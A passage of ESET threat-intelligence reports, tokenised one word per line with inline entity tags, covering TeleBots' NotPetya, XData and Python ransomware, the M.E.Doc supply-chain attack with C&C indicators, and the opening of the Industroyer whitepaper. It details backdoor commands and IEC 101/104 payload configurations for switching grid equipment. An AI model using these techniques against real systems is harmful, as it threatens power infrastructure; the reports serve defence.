non-Windows
servers
.

This
ransomware
is
detected
by
ESET
products
as
Python/Filecoder.R
and
,
predictably
,
it
is
written
in
the
Python
programming
language
.

This
time
attackers
execute
third-party
utilities
such
as
openssl
in
order
to
encrypt
files
.

The
encryption
is
done
using
the
RSA-2048
and
AES-256
algorithms
.

5/11

Figure
7
–
Python
code
of
Linux
ransomware
Python/Filecoder.R
used
by
the
TeleBots
group
.

In
the
code
of
Python
script
,
attackers
left
their
comment
which
had
following
text
:

feedback
:
openy0urm1nd[@]protonmail.ch

Win32/Filecoder.AESNI.C

On
18
May
2017
,
we
noticed
new
activity
on
the
part
of
another
ransomware
family
Win32/Filecoder.AESNI.C
(
also
referred
to
as
XData
)
.

This
ransomware
was
spread
mostly
in
Ukraine
,
because
of
an
interesting
initial
vector
.

According
to
our
LiveGrid®
telemetry
,
the
malware
was
created
right
after
execution
of
the
M.E.Doc
software
that
is
widely
used
by
accounting
personnel
in
Ukraine
.

The
Win32/Filecoder.AESNI.C
ransomware
had
a
spreading
mechanism
that
allowed
it
to
perform
lateral
movement
automatically
,
inside
a
compromised
company
LAN
.

Specifically
,
the
malware
had
an
embedded
Mimikatz
DLL
that
it
used
to
extract
Windows
account
credentials
from
the
memory
of
a
compromised
PC
.

With
these
credentials
,
the
malware
started
to
spread
inside
its
host
network
using
SysInternals
'
PsExec
utility
.

It
seems
that
the
attackers
either
did
not
reach
their
goal
on
that
occasion
,
or
it
was
the
test
before
a
more
effective
strike
.

The
attackers
posted
master
decryption
keys
on
the
BleepingComputer
forum
,
along
with
the
assertion
that
this
was
done
because
the
original
author
claimed
that
the
source
was
stolen
and
used
in
the
Ukraine
incident
.

ESET
published
a
decryption
tool
for
Win32/Filecoder.AESNI
ransomware
,
and
this
event
didn't
gain
much
media
attention
.

Diskcoder.C
(
aka
Petya
-
like
)
outbreak

What
did
gain
a
lot
of
media
attention
,
however
,
was
the
Petya-like B_malware.ransom
outbreak
of
27
June
,
2017
,
because
it
successfully
compromised
a
lot
of
systems
in
critical
infrastructure
and
other
businesses
in
Ukraine
,
and
further
afield
.

The
malware
in
this
attack
has
the
ability
to
replace
the
Master
Boot
Record
(
MBR
)
with
its
own
malicious
code
.

This
code
was
borrowed
from
Win32/Diskcoder.Petya
ransomware
.
That's
why
some
other
malware
researchers

6/11

have
named
this
threat
as
ExPetr B_malware.unknown
,
PetrWrap B_malware.ransom
,
Petya B_malware.ransom
,
or
NotPetya B_malware.ransom
.

However
,
unlike
the
original
Petya B_malware.ransom
ransomware
,
Diskcoder.C's
authors
modified
the
MBR
code
in
such
a
way
that
recovery
won't
be
possible
.

Specifically
,
the
attacker
cannot
provide
a
decryption
key
and
the
decryption
key
cannot
be
typed
in
the
ransom
screen
,
because
the
generated
key
contains
non-acceptable
characters
.

Visually
this
MBR
part
of
Diskcoder.C
looks
like
a
slightly
modified
version
of
Petya B_malware.ransom
:
at
first
it
displays
a
message
that
impersonates
CHKDSK
,
Microsoft's
disk
checking
utility
.

During
the
faux
CHKDISK
scan
Diskcoder.C
actually
encrypts
the
data
.

Figure
8
–
Fake
CHKDSK
message
displayed
by
Diskcoder.C.

When
encryption
is
complete
,
the
MBR
code
displays
the
next
message
with
payment
instructions
,
but
as
noted
before
this
information
is
useless
.

Figure
9
–
Diskcoder.C
message
with
payment
instructions
.

The
remainder
of
the
code
,
other
than
the
borrowed
MBR
,
was
implemented
by
the
authors
themselves
.

This
includes
file
encryption
that
can
be
used
as
a
complement
to
the
disk-encrypting
MBR
.

For
file
encryption
,
the

7/11

malware
uses
the
AES-128
and
RSA-2048
algorithms
.

It
should
be
noted
that
the
authors
made
mistakes
that
make
decryption
of
files
less
possible
.

Specifically
,
the
malware
encrypts
only
the
first
1MB
of
data
and
it
does
not
write
any
header
or
footer
,
only
raw
encrypted
data
and
does
not
rename
encrypted
files
,
so
it's
hard
to
say
which
files
are
encrypted
and
which
are
not
.

In
addition
to
that
,
files
that
are
larger
than
1MB
after
encryption
do
not
contain
padding
,
so
there
is
no
way
to
verify
the
key
.

Interestingly
,
the
list
of
target
file
extensions
is
not
identical
but
is
very
similar
to
the
file
extensions
list
from
the
killdisk B_malware.ransom
malware
used
in
the
December
2016
attacks
.

Figure
10
–
List
of
target
file
extensions
from
Diskcoder.C.

Once
the
malware
is
executed
it
attempts
to
spread
using
the
infamous
EternalBlue B_malware.unknown
exploit
,
leveraging
the
DoublePulsar
kernel-mode
backdoor
.

Exactly
the
same
method
was
used
in
the
WannaCryptor.D
ransomware
.

Diskcoder.C
also
adopted
the
method
from
the
Win32/Filecoder.AESNI.C
(
aka
XData
)
ransomware
:
it
uses
a
lightweight
version
of
Mimikatz
to
obtain
credentials
and
then
executes
the
malware
using
SysInternals
'
PsExec
on
other
machines
on
the
LAN
.

In
addition
to
that
,
the
attackers
implemented
a
third
method
of
spreading
using
a
WMI
mechanism
.

All
three
of
these
methods
have
been
used
to
spread
malware
inside
LANs
.

Unlike
the
infamous
WannaCryptor B_malware.ransom
malware
,
the
EternalBlue B_malware.unknown
exploit
is
used
by
Diskcoder.C
only
against
computers
within
the
local
network
address
space
.

Why
are
there
infections
in
other
countries
than
Ukraine
?

Our
investigation
revealed
that
affected
companies
in
other
countries
had
VPN
connections
to
their
branches
,
or
to
business
partners
,
in
Ukraine
.

Initial
infection
vector

Both
Diskcoder.C
and
Win32/Filecoder.AESNI.C
used
a
supply-chain
attack
as
the
initial
infection
vector
.

These
malware
families
were
spread
using
Ukrainian
accounting
software
called
M.E.Doc
.

There
are
several
options
for
how
this
attack
can
be
implemented
.

The
M.E.Doc
has
an
internal
messaging
and
document
exchange
system
so
attackers
could
send
spearphishing
messages
to
victims
.

User
interaction
is
required
in
order
to
execute
something
malicious
in
this
way
.

Thus
,
social
engineering
techniques
would
be
involved
.

Since
Win32/Filecoder.AESNI.C
didn't
spread
so
widely
,
we
mistakenly
assumed
that
these
techniques
were
used
in
this
case
.

However
,
the
subsequent
Diskcoder.C
outbreak
suggests
that
the
attackers
had
access
to
the
update
server
of
the
legitimate
software
.

Using
access
to
this
server
,
attackers
pushed
a
malicious
update
that
was
applied
automatically
without
user
interaction
.

That's
why
so
many
systems
in
Ukraine
were
affected
by
this
attack
.

However
,
it
seems
like
the
malware
authors
underestimated
the
spreading
capabilities
of
Diskcoder.C.

ESET
researchers
found
evidence
that
supports
this
theory
.

Specifically
,
we
identified
a
malicious
PHP
backdoor
that
was
deployed
under
medoc_online.php
in
one
of
the
FTP
directories
on
M.E.Doc's
server
.

This
backdoor
was
accessible
from
HTTP;
however
,
it
was
encrypted
,
so
the
attacker
would
have
to
have
the
password
in
order
to
use

8/11

Figure
11
–
Listing
of
FTP
directory
containing
the
PHP
backdoor
.

We
should
say
that
there
are
signs
that
suggest
that
Diskcoder.C
and
Win32/Filecoder.AESNI.C
were
not
the
only
malware
families
that
were
deployed
using
that
infection
vector
.

We
can
speculate
that
these
malicious
updates
were
deployed
in
a
stealthy
way
to
computer
networks
that
belong
to
high-value
targets
.

One
such
malware
that
was
deployed
via
this
possible
compromised
M.E.Doc
update
server
mechanism
was
the
VBS B_malware.backdoor
backdoor
used
by
the
TeleBots
group
.

This
time
the
attacker
again
used
a
financially-themed
domain
name
:
bankstat.kiev[.]ua B_url.unknown
.

On
the
day
of
the
Diskcoder.C
outbreak
,
the
A-record
of
this
domain
was
changed
to
10.0.0.1

Conclusions

The
TeleBots
group
continues
to
evolve
in
order
to
conduct
disruptive
attacks
against
Ukraine
.

Instead
of
spearphishing
emails
with
documents
containing
malicious
macros
,
they
used
a
more
sophisticated
scheme
known
as
a
supply-chain
attack
.

Prior
to
the
outbreak
,
the
Telebots
group
targeted
mainly
the
financial
sector
.

The
latest
outbreak
was
directed
against
businesses
in
Ukraine
,
but
they
apparently
underestimated
the
malware
'
spreading
capabilities
.

That's
why
the
malware
went
out
of
control
.

Indicators
of
Compromise
(
IoC
)

ESET
detection
names
:

Win32/TeleBot
trojan

VBS/Agent.BB
trojan

VBS/Agent.BD
trojan

VBS/Agent.BE
trojan

Win32/PSW.Agent.ODE
trojan

Win64/PSW.Agent.K
trojan

Python/Filecoder.R
trojan

Win32/Filecoder.AESNI.C
trojan

Win32/Filecoder.NKH
trojan

Win32/Diskcoder.C
trojan

Win64/Riskware.Mimikatz
application

Win32/RiskWare.Mimikatz
application

C&C
servers
:

9/11

transfinance.com[.]ua B_url.cncsvr
(
IP
:
130.185.250.171 B_ip.cncsvr
)
bankstat.kiev[.]ua  B_url.cncsvr
(
IP
:
82.221.128.27 B_ip.cncsvr
)
www.capital-investing.com[.]ua  B_url.cncsvr
(
IP
:
82.221.131.52 B_ip.cncsvr
)

Legitimate
servers
abused
by
malware
authors
:

api.telegram.org
(
IP
:
149.154.167.200 B_ip.unknown
,
149.154.167.197 B_ip.unknown
,
149.154.167.198 B_ip.unknown
,
149.154.167.199 B_ip.unknown
)

VBS B_malware.backdoor
backdoor
:
1557E59985FAAB8EE3630641378D232541A8F6F9
31098779CE95235FED873FF32BB547FFF02AC2F5
CF7B558726527551CDD94D71F7F21E2757ECD109

Mimikatz
:
91D955D6AC6264FBD4324DB2202F68D097DEB241
DCF47141069AECF6291746D4CDF10A6482F2EE2B
4CEA7E552C82FA986A8D99F9DF0EA04802C5AB5D
4134AE8F447659B465B294C131842009173A786B
698474A332580464D04162E6A75B89DE030AA768
00141A5F0B269CE182B7C4AC06C10DEA93C91664
271023936A084F52FEC50130755A41CD17D6B3B1
D7FB7927E19E483CD0F58A8AD4277686B2669831
56C03D8E43F50568741704AEE482704A4F5005AD
38E2855E11E353CEDF9A8A4F2F2747F1C5C07FCF
4EAAC7CFBAADE00BB526E6B52C43A45AA13FD82B
F4068E3528D7232CCC016975C89937B3C54AD0D1

Win32/TeleBot
:
A4F2FF043693828A46321CCB11C5513F73444E34
5251EDD77D46511100FEF7EBAE10F633C1C5FC53

Win32/PSW.Agent.ODE
(
CredRaptor
)
:
759DCDDDA26CF2CC61628611CF14CFABE4C27423
77C1C31AD4B9EBF5DB77CC8B9FE9782350294D70
EAEDC201D83328AF6A77AF3B1E7C4CAC65C05A88
EE275908790F63AFCD58E6963DC255A54FD7512A
EE9DC32621F52EDC857394E4F509C7D2559DA26B
FC68089D1A7DFB2EB4644576810068F7F451D5AA

10/11

Win32/Filecoder.NKH
:
1C69F2F7DEE471B1369BF2036B94FDC8E4EDA03E

Python/Filecoder.R
:
AF07AB5950D35424B1ECCC3DD0EEBC05AE7DDB5E

Win32/Filecoder.AESNI.C
:
BDD2ECF290406B8A09EB01016C7658A283C407C3
9C694094BCBEB6E87CD8DD03B80B48AC1041ADC9
D2C8D76B1B97AE4CB57D0D8BE739586F82043DBD

Win32/Diskcoder.C
:
34F917AABA5684FBE56D3C57D48EF2A1AA7CF06D

PHP
shell
:
D297281C2BF03CE2DE2359F0CE68F16317BF0A86

11/11
WIN32
/
Industroyer B_malware.backdoor

A
new
threat
for
industrial
control
systems

Anton
Cherepanov
,
ESET

Version
2017-06-12

Contents

Win32
/
Industroyer B_malware.backdoor
:
a
new
threat
for
industrial
control
systems
2

Main
backdoor

Additional
backdoor
4

Launcher
component

101
payload
component
6

104
payload
component
7

61850
payload
component

OPC
DA
payload
component
12

Data
wiper
component

Additional
tools
:
port
scanner
tool
14

Additional
tools
:
DoS
tool
15

Conclusion
15

Indicators
of
Compromise
(
IoC
)

Win32
/
Industroyer B_malware.backdoor
Win32
/
Industroyer B_malware.backdoor
:
a
new
threat
for
industrial
control
systems

Win32
/
Industroyer B_malware.backdoor
is
a
sophisticated
piece
of
malware
designed
to
disrupt
the
working
processes
of
industrial
control
systems
(
ICS
)
,
specifically
industrial
control
systems
used
in
electrical
substations
.

Those
behind
the
Win32
/
Industroyer B_malware.backdoor
malware
have
a
deep
knowledge
and
understanding
of
industrial
control
systems
and
,
specifically
,
the
industrial
protocols
used
in
electric
power
systems
.

Moreover
,
it
seems
very
unlikely
anyone
could
write
and
test
such
malware
without
access
to
the
specialized
equipment
used
in
the
specific
,
targeted
industrial
environment
.

Support
for
four
different
industrial
control
protocols
,
specified
in
the
standards
listed
below
,
has
been
implemented
by
the
malware
authors
:

•
IEC
60870-5-101
(
aka
IEC
101
)

•
IEC
60870-5-104
(
aka
IEC
104
)

•
IEC
61850

•
OLE
for
Process
Control
Data
Access
(
OPC
DA
)

In
addition
to
all
that
,
the
malware
authors
also
wrote
a
tool
that
implements
a
denial
-
of
-
service
(
DoS
)
attack
against
a
particular
family
of
protection
relays
,
specifically
the
Siemens
SIPROTEC
range
.

All
this
considered
,
the
Win32
/
Industroyer B_malware.backdoor
malware
authors
show
an
intensive
focus
that
suggests
they
are
highly
specialized
in
industrial
control
systems
.

The
capabilities
of
this
malware
are
significant
When
compared
to
the
toolset
used
by
threat
actors
in
the
2015
attacks
against
the
Ukrainian
power
grid
which
culminated
in
a
black
out
on
December
23
,
2015
(
BlackEnergy B_malware.ddos
,
killdisk B_malware.ransom
,
and
other
components
,
including
legitimate
remote
access
software
)
the
gang
behind
Industroyer B_malware.backdoor
are
more
advanced
,
since
they
went
to
great
lengths
to
create
malware
capable
of
directly
controlling
switches
and
circuit
breakers
We
have
seen
indications
that
this
malware
could
have
been
the
tool
used
by
attackers
to
cause
the
power
outage
in
Ukraine
in
December
2016
,
although
at
the
time
of
writing
,
it
is
not
confirmed
,
and
the
investigation
is
still
ongoing
.

The
infection
vector
remains
unknown
.

The
malware
contains
multiple
modules
,
as
analyzed
and
described
in
the
next
sections
of
this
whitepaper
.

However
,
before
diving
into
those
details
,
the
following
simplified
schematic
shows
the
connections
between
the
components
of
the
malware
.

Figure
1
.
Simplified
schematic
of
Win32
/
Industroyer B_malware.backdoor
components
.

While
some
components
(
e
g
Data
wiper
)
are
similar
in
concept
to
the
2015
BlackEnergy B_malware.ddos
attacks
against
power
grid
companies
in
Ukraine
,
we
don't
see
any
link
between
those
attacks
and
the
code
in
this
malware
.

Win32
/
Industroyer B_malware.backdoor

Main
backdoor

We
refer
to
the
core
component
of
Industroyer B_malware.backdoor
as
the
main
backdoor
.

The
main
backdoor
is
used
by
the
attackers
behind
Industroyer B_malware.backdoor
to
control
all
other
components
of
the
malware
.

As
backdoors
go
,
this
component
is
pretty
straightforward
,
connecting
to
its
remote
C&C
server
using
HTTPS
and
receiving
commands
from
the
attackers
.

All
analyzed
samples
are
hardcoded
to
use
the
same
proxy
address
,
located
in
the
local
network
.

Thus
,
the
backdoor
is
clearly
designed
to
work
only
in
one
specific
organization
.

It
is
also
worth
mentioning
that
most
of
the
C&C
servers
used
by
this
backdoor
are
running
Tor
software
.

Perhaps
the
most
interesting
feature
of
this
backdoor
is
that
attackers
can
define
a
specific
hour
of
the
day
when
the
backdoor
will
be
active
.

For
example
,
the
attackers
can
modify
the
backdoor
in
this
way
so
it
will
communicate
with
its
C&C
server
only
outside
working
hours
.

This
can
make
detection
based
only
on
network
traffic
examination
harder
.

However
,
all
the
samples
analyzed
so
far
are
set
to
work
24
hours
round
the
clock
.

Figure
2
.
The
decompiled
main
backdoor
code
has
a
check
for
time-of-day
.

Once
connected
to
its
remote
C&C
server
,
the
main
backdoor
component
sends
the
following
data
in
a
POST-request
:

•
the
globally
unique
identifier
(
GUID
)
string
for
the
current
hardware
profile
retrieved
via
GetCurrentHwProfile

•
the
version
of
the
malware
:
1
1e

•
the
hardcoded
ID
of
the
sample

•
the
result
of
any
previously-received
command

The
hardcoded
ID
is
used
by
the
attacker
as
an
identifier
for
the
infected
machine
.

Across
all
analyzed
samples
we
found
the
following
hardcoded
ID
values
:

•
DEF

•
DEF-C

•
DEF-WS

•
DEF-EP

•
DC-2-TEMP

•
DC-2

•
CES-McA-TEMP

•
CES

•
SRV_WSUS

•
SRV_DC-2

•
SCE-WSUS01

The
main
backdoor
component
supports
the
following
commands
:

Command
ID

Purpose

Execute
a
process

Execute
a
process
under
a
specific
user
account
.

Credentials
for
the
account
are
supplied
by
the
attacker

Download
a
file
from
C&C
server

Copy
a
file

Win32
/
Industroyer B_malware.backdoor

Command
ID

Purpose

Execute
a
shell
command

Execute
a
shell
command
under
a
specific
user
account
.

Credentials
for
the
account
are
supplied
by
the
attacker

Quit

Stop
a
service

Stop
a
service
under
a
specific
user
account
.

Credentials
for
the
account
are
supplied
by
the
attacker

Start
a
service
under
a
specific
user
account
.

Credentials
for
the
account
are
supplied
by
the
attacker

Replace
'
Image
path
'
registry
value
for
a
service

Once
the
attackers
obtain
administrator
privileges
,
they
can
upgrade
the
installed
backdoor
to
a
more
privileged
version
that
is
executed
as
a
Windows
service
program
.

To
do
this
they
pick
an
existing
,
non-critical
Windows
service
and
replace
its
ImagePath
registry
value
with
the
path
of
the
new
backdoor's
binary
.

The
functionality
of
the
main
backdoor
that
works
as
a
Windows
service
is
the
same
as
just
described
However
,
there
are
two
small
differences
:

first
the
backdoor's
version
is
1
1s
,
instead
of
1
1e
,
and
second
,
there
is
code
obfuscation
.

The
code
of
this
version
of
the
backdoor
is
mixed
with
junk
assembly
instructions
.

Figure
3
.
The
obfuscated
assembly
code
of
the
main
backdoor
that
works
as
a
Windows
service
.

Additional
backdoor

The
additional
backdoor
provides
an
alternative
persistence
mechanism
that
allows
the
attackers
to
regain
access
to
a
targeted
network
in
case
the
main
backdoor
is
detected
and/or
disabled
.

This
backdoor
is
a
trojanized
version
of
the
Windows
Notepad
application
.

This
is
a
fully
functional
version
of
the
application
,
but
the
malware
authors
have
inserted
malicious
code
that
is
executed
each
time
the
application
is
launched
.

Once
the
attackers
gain
administrator
privileges
,
they
are
able
to
replace
the
legitimate
Notepad
manually
.

The
inserted
malicious
code
is
heavily
obfuscated
,
but
once
the
code
is
decrypted
it
connects
to
a
remote
C&C
server
,
which
is
different
to
the
one
linked
in
the
main
backdoor
,
and
downloads
a
payload
.

This
is
in
the
form

Win32
/
Industroyer B_malware.backdoor

of
shellcode
that
is
loaded
directly
into
memory
and
executed
.

In
addition
,
the
inserted
code
decrypts
the
original
Windows
Notepad
code
,
which
is
stored
at
the
end
of
the
file
,
and
then
passes
execution
to
it
.

Thus
,
the

Notepad
application
works
as
expected
.

Figure
4
.
Comparison
between
original
Notepad
binary
code
(
at
the
left
)
and
backdoored
binary
code
.

Launcher
component

This
component
is
a
separate
executable
responsible
for
launching
the
payloads
and
the
Data
wiper
component
.

The
Launcher
component
contains
a
specific
time
and
date
.

Analyzed
samples
contained
two
dates
,
17th
December
2016
and
20th
December
2016
.

Once
one
of
these
dates
is
reached
the
component
creates
two
threads
.

The
first
thread
makes
attempts
to
load
a
payload
DLL
,
while
the
second
thread
waits
one
or
two
hours
(
it
depends
on
the
Launcher
component
version
)
and
then
attempts
to
load
the
Data
wiper
component
.

The
priority
for
both
threads
is
set
to
THREAD_PRIORITY_HIGHEST
,
which
means
that
these
two
threads
receive
a
higher
than
normal
share
of
CPU
resources
from
the
operating
system
.

The
name
of
the
payload
DLL
is
supplied
by
the
attackers
via
a
command
line
parameter
supplied
in
one
of
the
main
backdoor's
'
execute
a
shell
command
'
commands
.

The
Data
wiper
component
is
always
named
haslo.‌dat
The
expected
command
lines
are
of
the
form
:

%LAUNCHER%.exe‌%WORKING_DIRECTORY%‌%PAYLOAD%.dll‌
%CONFIGURATION%.ini

Each
argument
on
the
command
line
represents
the
following
:

•
%LAUNCHER%.exe
is
the
filename
of
the
Launcher
component

•
%WORKING_DIRECTORY%
is
the
directory
where
the
payload
DLL
and
configuration
is
stored

•
%PAYLOAD%.dll
is
the
filename
of
the
payload
DLL

•
%CONFIGURATION%.ini
is
the
file
that
stores
configuration
data
for
the
specified
payload
The
path
to
this
file
is
supplied
to
the
payload
DLL
by
the
Launcher
component

The
payload
and
Data
wiper
components
are
standard
Windows
DLL
files
.

In
order
to
be
loaded
by
the
Launcher
component
they
must
export
a
function
named
Crash
as
seen
in
Figure
5
.

Win32
/
Industroyer B_malware.backdoor
6

Windows
device
names
(
usually
COM
ports
)
,
the
number
of
Information
Object
Address
(
IOA
)
ranges
,
and
the
beginning
and
ending
IOA
values
for
the
specified
number
of
IOA
ranges
.

IOA
is
a
number
that
identifies
a
particular
data
element
in
the
device
Figure
6
.
illustrates
a
101
payload
configuration
file
with
two
defined
IOA
ranges
,
10-15
and
20-25
,

Figure
5
.
Example
payload
DLL
that
has
internal
name
Crash101.dll
and
Crash
export
function
.

101
payload
component

This
payload
DLL
has
the
filename
101.dll
and
is
named
after
IEC
101
(
aka
IEC
60870-5-101
)
,
an
international
standard
that
describes
a
protocol
for
monitoring
and
controlling
electric
power
systems
.

The
protocol
is
used
for
communication
between
industrial
control
systems
and
Remote
Terminal
Units
(
RTUs
)
.

The
actual
communication
is
transmitted
through
a
serial
connection
.

The
101
payload
component
partly
implements
the
protocol
described
in
the
IEC
101
standard
and
is
able
to
communicate
with
an
RTU
or
any
other
device
with
support
for
that
protocol
.

Once
executed
,
the
101
payload
component
parses
the
configuration
stored
in
its
INI
file
.

The
configuration
may
contain
several
entries
:
process
name
,

Figure
6
.
An
example
of
a
101
payload
DLL
configuration
.

The
name
of
the
process
specified
in
the
configuration
belongs
to
an
application
the
attackers
suspect
is
running
on
the
victim
machine
.

It
should
be
the
application
the
victim
machine
uses
to
communicate
through
serial
connection
with
the
RTU
.

The
101
payload
attempts
to
terminate
the
specified
process
and
starts
to
communicate
with
the
specified
device
,
using
the
CreateFile
,
WriteFile
and
ReadFile

Windows
API
functions
.

The
first
COM
port
from
the
configuration
file
is
used
for
the
actual
communication
and
the
two
other
COM
ports
are
just
opened
to
prevent
other
processes
accessing
them
.

Thus
,
the
101
payload
component
is
able
to
take
over
and
maintain
control
of
the
RTU
device
.

This
component
iterates
through
all
IOAs
in
the
defined
IOA
ranges
.

For
each
such
IOA
it
constructs
two
'
select
and
execute
'
packets
,
one
with
a
single
command
(
C_SC_NA_1
)
and
one
with
a
double
command
(
C_DC_NA_1
)
and
sends
these
to
the
RTU
device
.

The
main
goal
of
the
component
is
to
change
the
On/Off
state
of
single
command
type
IOA

Win32
/
Industroyer B_malware.backdoor

and
double
command
type
IOA
Specifically
,
the
101
payload
has
three
stages
:

in
the
first
stage
this
component
attempts
to
switch
IOAs
to
their
Off
state
,
in
the
second
stage
it
attempts
to
invert
IOA
states
to
On
,
and
in
the
final
stage
the
component
switches
IOA
states
to
Off
again
.

104
payload
component

This
payload
DLL
has
the
filename
104
.
dll
and
is
named
after
IEC
104
(
aka
IEC
60870-5-104
)
,
an
international
standard
The
IEC
104
protocol
extends
IEC
101
,
so
the
protocol
can
be
transmitted
over
a
TCP/IP
network
.

Due
to
its
highly
configurable
nature
,
this
payload
can
be
customized
by
the
attackers
for
different
infrastructures
Figure
8
.
shows
what
a
configuration
file
may
look
like
.

Figure
8
.
An
example
of
104
payload
DLL
configuration
.

Once
executed
,
the
104
payload
DLL
attempts
to
read
its
configuration
file
.

As
described
above
,
the
path
for
the
configuration
file
is
supplied
by
the
Launcher
component
.

The
configuration
contains
a
STATION
section
followed
by
properties
that
configure
how
the
104
payload
should
work
.

The
configuration
may
contain
multiple
STATION
entries
.

Figure
7
.
An
example
of
a
101
payload
packet
,
after
being
dissected
in
Kaitai
Struct
WebIDE

Win32
/
Industroyer B_malware.backdoor

Our
analysis
of
this
component
reveals
the
following
possible
configuration
properties
:

Property
target_ip

Expected
value

IP
address

target_port

uselog

Port
number

1
or
0

logfile

Filename

stop_comm_
service

stop_comm_
service_name

timeout

socket_timeout

silence

asdu

1
or
0

Process
name

Timeout
in
milliseconds

Timeout
in
milliseconds

1
or
0

Integer

first_action

on
or
off
change

1
or
0

command_type

def
or
short
or
long
or
persist

Purpose

The
IP
address
that
will
be
used
for
the
communication
using
IEC
104
protocol
standard

Self-explanatory

Enables
or
disables
logging
to
a
file

Specifies
the
filename
for
the
log
,
if
enabled

Enables
or
disables
termination
of
the
process

Specifies
the
process
name
that
will
be
terminated

Specifies
timeout
between
send
and
recv
calls
Default
value
:
15000

Specify
the
receiving
timeout
.

Default
value
:
15000

Enables
or
disables
console
output

Specifies
ASDU
(
Application
Service
Data
Unit
)
address
also
known
as
sector

Specifies
the
Switch
value
in
ASDU
packet
for
first
iteration

Specifies
that
the
Switch
value
in
ASDU
packet
should
be
inverted
during
iterations

Specifies
command
pulse
duration
for
qualifier
of
command
(
QOC
)

Property

operation

range

sequence

shift

Expected
value

range
or
sequence
or
shift

Specific
format
of
IOAs

Specific
format
of
IOAs

Specific
formatof
IOAs

Purpose

Specifies
iteration
type
for
Information
Object
Addresses
(
IOA
)

Specifies
range
of
Information
Object
Addresses
(
IOA
)

Specifies
sequence
of
Information
Object
Addresses
(
IOA
)

Specifies
shift
of
Information
Object
Addresses
(
IOA
)

Once
the
configuration
file
is
read
,
the
104
payload
creates
a
thread
for
each
STATION
section
defined
in
the
configuration
file
.

In
each
such
thread
,
the
104
payload
will
attempt
to
communicate
with
the
specified
IP
address
using
the
protocol
described
in
the
IEC
104
standard
.

Before
the
connection
is
made
,
the
104
payload
attempts
to
terminate
the
legitimate
process
that
is
normally
responsible
for
IEC
104
communication
with
the
device
.

It
does
so
only
if
the
stop_comm_service
property
is
specified
in
its
configuration
.

By
default
,
the
104
payload
terminates
the
process
named
D2MultiCommService.exe
,
or
the
process
name
specified
in
its
configuration
.

The
main
idea
behind
the
104
payload
is
relatively
simple
.

It
connects
to
the
specified
IP
address
and
starts
to
send
packets
with
the
ASDU
address
that
was
defined
in
its
configuration
.

The
goal
of
this
communication
is
to
interact
with
an
IOA
of
a
single
command
type
.

In
the
configuration
file
,
the
attacker
can
define
the
operation
property
to
specify
exactly
how
single
command
type
IOAs
will
be
iterated
.

The
first
such
operation
mode
is
the
range
mode
.

The
attackers
use
this
mode
in
order
to
discover
possible
IOAs
in
the
targeted
device
.

The
attackers
have
to
take
this
approach
because
the
protocol
described
in
the
IEC
104
standard
does
not
provide
a
specific
method
to
obtain
such
information
.

Win32
/
Industroyer B_malware.backdoor

The
range
mode
has
two
stages
.

During
the
first
stage
,
once
the
range
of
IOAs
is
obtained
from
the
configuration
file
,
the
104
payload
connects
to
the
target
IP
address
and
starts
to
iterate
through
the
specified
IOAs
.

To
each
such
IOA
the
104
payload
sends
'
select
and
execute
'
packets
in
order
to
switch
the
state
and
to
confirm
whether
the
IOA
belongs
to
the
single
command
type
.

enabled
,
so
between
loop
iterations
the
payload
flipped
the
switch
value
from
On
to
Off
and
wrote
it
to
the
log
.

Figure
9
.
An
example
of
a
104
payload
packet
,
after
being
dissected
by
Wireshark
.

Once
all
possible
IOAs
from
the
specified
range
are
iterated
,
the
104
payload
switches
to
the
second
stage
of
range
mode
.

If
logging
is
enabled
,
the
payload
writes
Starting‌only‌success
to
the
log
.

The
rest
of
this
second
stage
is
an
infinite
loop
that
uses
the
previously
discovered
IOAs
of
single
command
type
.

In
the
loop
the
payload
constantly
sends
'
select
and
execute
'
packets
.

In
addition
,
if
the
option
change
is
defined
,
the
payload
flips
the
On/Off
state
between
loop
steps
.

Figure
10
.
demonstrates
the
log
file
that
was
produced
by
the
104
payload
during
our
analysis
.

It
shows
the
payload
iterated
IOAs
from
10
to
15
,
and
once
IOAs
of
the
single
command
type
were
discovered
,
the
payload
started
to
use
them
in
the
loop
.

The
configuration
had
the
change
option

Figure
10
.
Example
log
file
produced
by
the
104
payload

The
second
operation
mode
is
the
shift
mode
.

This
is
very
similar
to
the
range
mode
.

The
attacker
defines
,
in
the
configuration
file
,
a
range
of
IOAs
and
shift
values
.

Once
the
104
payload
is
activated
it
does
everything
the
same
way
as
in
range
mode
;

however
,
once
all
IOAs
in
the
defined
range
are
iterated
,
it
starts
to
iterate
over
the
new
range
.

The
new
range
is
calculated
by
adding
the
shift
values
to
the
default
range
values
.

The
third
operation
mode
is
the
sequence
mode
It
can
be
used
by
attackers
once
they
know
the
values
of
all
IOAs
of
the
single
command
type
that
are
supported
by
the
connected
device
.

This
payload
immediately

Win32
/
Industroyer B_malware.backdoor

executes
an
infinite
loop
,
sending
'
select
and
execute
'
packets
to
the
IOAs
defined
in
the
configuration
file
.

Aside
from
its
logging
capability
,
the
104
payload
can
output
debug
information
to
the
console
,
as
seen
in
Figure
11
.

Figure
11
.
The
console
output
of
the
104
payload
.

61850
payload
component

Unlike
the
101
and
104
payloads
,
this
payload
component
exists
as
a
standalone
malicious
tool
comprising
an
executable
named
61850.exe
and
the
DLL‌61850.dll
It
is
named
after
the
IEC
61850
standard
.

This
standard
describes
a
protocol
used
for
multivendor
communication
among
devices
that
perform
protection
,
automation
,
metering
,
monitoring
,
and
control
of
electrical
substation
automation
systems
.

The
protocol
is
very
complex
and
robust
,
but
the
61850
payload
uses
only
a
small
subset
of
the
protocol
to
produce
its
disruptive
effect
.

Once
executed
,
the
61850
payload
DLL
attempts
to
read
the
configuration
file
,
the
path
to
which
is
supplied
by
the
Launcher
component
.

The
standalone
version
defaults
to
reading
its
configuration
from‌i.ini
The
configuration
file
is
expected
to
contain
a
list
of
IP
addresses
of
devices
capable
of
communicating
via
the
protocol
described
in
the
IEC
61850
standard
.

If
the
configuration
file
is
not
present
,
then
this
component
enumerates
all
connected
network
adaptors
to
determine
their
TCP/IP
subnet
masks
.

The
61850
payload
then
enumerates
all
possible
IP
addresses
for
each
of
these
subnet
masks
,
and
tries
to
connect
to
port
102
on
each
of
those
addresses
.

Therefore
,
this
component
has
the
ability
to
discover
relevant
devices
in
the
network
automatically
.

Otherwise
,
if
a
configuration
file
is
present
and
it
contains
target
IP
addresses
,
this
component
connects
to
port
102
on
those
IP
addresses
and
on
IP
addresses
that
were
discovered
automatically
.

Once
this
component
connects
to
a
target
host
,
it
sends
a
Connection
Request
packet
using
the
Connection
Oriented
Transport
Protocol
,
as
seen
in
Figure
12
.

Win32
/
Industroyer B_malware.backdoor

11

Figure
12
A
Connection
Request
